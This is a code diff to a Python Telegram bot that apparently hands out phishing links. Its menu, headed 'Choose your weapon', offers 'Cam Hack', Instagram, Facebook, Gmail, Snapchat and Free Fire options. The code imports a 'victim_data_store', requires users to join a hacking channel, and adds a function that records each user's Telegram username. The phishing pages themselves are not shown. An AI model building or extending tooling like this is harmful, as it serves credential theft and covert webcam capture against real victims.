@@ -17,34 +17,21 @@ from bot.buttons import (
     handle_all_links, handle_copy_all
 )
 from bot.server import app
-from bot.utils.storage import link_cache, victim_data_store
+from bot.utils.storage import (
+    link_cache,
+    victim_data_store,
+    user_username_cache,
+    active_users,
+    save_active_users
+)
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ========== OWNER ID ==========
-OWNER_ID = 7993444324  # <-- APNI TELEGRAM ID DAAL
+# ========== OWNER ID (APNI TELEGRAM ID DAAL) ==========
+OWNER_ID = 7993444324
 
 # ========== BROADCAST STATE ==========
 broadcast_mode = False
-ACTIVE_USERS_FILE = "active_users.json"
-
-def load_active_users():
-    if os.path.exists(ACTIVE_USERS_FILE):
-        try:
-            with open(ACTIVE_USERS_FILE, 'r') as f:
-                return set(json.load(f))
-        except:
-            return set()
-    return set()
-
-def save_active_users(users_set):
-    try:
-        with open(ACTIVE_USERS_FILE, 'w') as f:
-            json.dump(list(users_set), f)
-    except Exception as e:
-        print(f"Save error: {e}")
-
-active_users = load_active_users()
 
 # ========== CHECK JOIN ==========
 def check_user_joined(user_id):
@@ -53,6 +40,17 @@ def check_user_joined(user_id):
         return chat_member.status not in ['left', 'kicked']
     except:
         return False
+
+# ========== CAPTURE USERNAME ==========
+def capture_username(user_id):
+    try:
+        chat = bot.get_chat(user_id)
+        if chat.username:
+            user_username_cache[user_id] = f"@{chat.username}"
+        else:
+            user_username_cache[user_id] = f"{chat.first_name or 'Unknown'}"
+    except:
+        user_username_cache[user_id] = "Unknown"
 
 # ========== BOTTOM BUTTONS ==========
 def get_bottom_buttons():
@@ -83,17 +81,14 @@ def get_join_buttons():
 @bot.message_handler(commands=['hukum'])
 def hukum_command(message):
     user_id = message.chat.id
-
     if user_id != OWNER_ID:
         bot.reply_to(message, "❌ Ye command sirf owner ke liye hai.")
         return
-
     markup = InlineKeyboardMarkup(row_width=2)
     markup.add(
         InlineKeyboardButton("🟢 ON", callback_data="broadcast_on"),
         InlineKeyboardButton("🔴 OFF", callback_data="broadcast_off")
     )
-
     bot.send_message(
         user_id,
         "⚙️ *Broadcast Control*\n\n"
@@ -110,37 +105,29 @@ def hukum_command(message):
 def broadcast_callback(call):
     global broadcast_mode
     user_id = call.from_user.id
-
     if user_id != OWNER_ID:
         bot.answer_callback_query(call.id, "❌ Ye sirf owner ke liye hai.")
         return
-
     if call.data == "broadcast_on":
         broadcast_mode = True
         bot.answer_callback_query(call.id, "🟢 Broadcast ON")
         bot.send_message(
             user_id,
-            f"🟢 *Broadcast ON*\n\n"
-            f"👥 Total Users: {len(active_users)}\n\n"
-            "Ab tu jo bhi message bhejega, woh saare active users ko chala jayega.",
+            f"🟢 *Broadcast ON*\n\n👥 Total Users: {len(active_users)}\n\nAb tu jo bhi message bhejega, woh saare active users ko chala jayega.",
             parse_mode="Markdown"
         )
     elif call.data == "broadcast_off":
         broadcast_mode = False
         bot.answer_callback_query(call.id, "🔴 Broadcast OFF")
-        bot.send_message(
-            user_id,
-            "🔴 *Broadcast OFF*\n\nAb bot normal chalega.",
-            parse_mode="Markdown"
-        )
+        bot.send_message(user_id, "🔴 *Broadcast OFF*\n\nAb bot normal chalega.", parse_mode="Markdown")
 
 # ========== /START ==========
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.chat.id
-
     active_users.add(user_id)
     save_active_users(active_users)
+    capture_username(user_id)
 
     if check_user_joined(user_id):
         show_main_menu(message)
@@ -160,6 +147,7 @@ def start(message):
 @bot.callback_query_handler(func=lambda call: call.data == "verify_join")
 def verify_join(call):
     user_id = call.from_user.id
+    capture_username(user_id)
 
     if check_user_joined(user_id):
         bot.answer_callback_query(call.id, "✅ Verified!")
@@ -190,15 +178,15 @@ def show_main_menu(message):
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         "📌 *Choose your weapon:*\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        "📸 Cam Hack (working)\n"
-        "📸 Instagram (working)\n"
-        "📘 Facebook (working)\n"
-        "🐦 Twitter (working)\n"
-        "👻 Snapchat (working)\n"
-        "📧 Gmail (working)\n"
-        "🎮 Free Fire (working)\n"
-        "🎬 GoLiveGram (working)\n"
-        "🔗 All Links (working)\n\n"
+        "📸 Cam Hack \n"
+        "📸 Instagram \n"
+        "📘 Facebook \n"
+        "🐦 Twitter \n"
+        "👻 Snapchat \n"
+        "📧 Gmail \n"
+        "🎮 Free Fire \n"
+        "🎬 GoLiveGram \n"
+        "🔗 All Links \n\n"
         "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
         "💬 *Use buttons below or type commands.*\n"
         "⚠️ *Stay anonymous. Stay safe.*",
@@ -217,7 +205,9 @@ def route_buttons(message):
         active_users.add(user_id)
         save_active_users(active_users)
 
-    # ===== BROADCAST MODE =====
+    capture_username(user_id)
+
+    # ===== BROADCAST MODE (OWNER ONLY) =====
     if broadcast_mode and user_id == OWNER_ID:
         if text and text.startswith('/'):
             return
@@ -249,7 +239,11 @@ def route_buttons(message):
 
     # ===== NORMAL ROUTING =====
     if not check_user_joined(user_id):
-        bot.send_message(user_id, "❌ You must join @nr_hackz first. Send /start again.", reply_markup=get_join_buttons())
+        bot.send_message(
+            user_id,
+            "❌ You must join @nr_hackz first. Send /start again.",
+            reply_markup=get_join_buttons()
+        )
         return
 
     if text == "📸 Cam Hack":
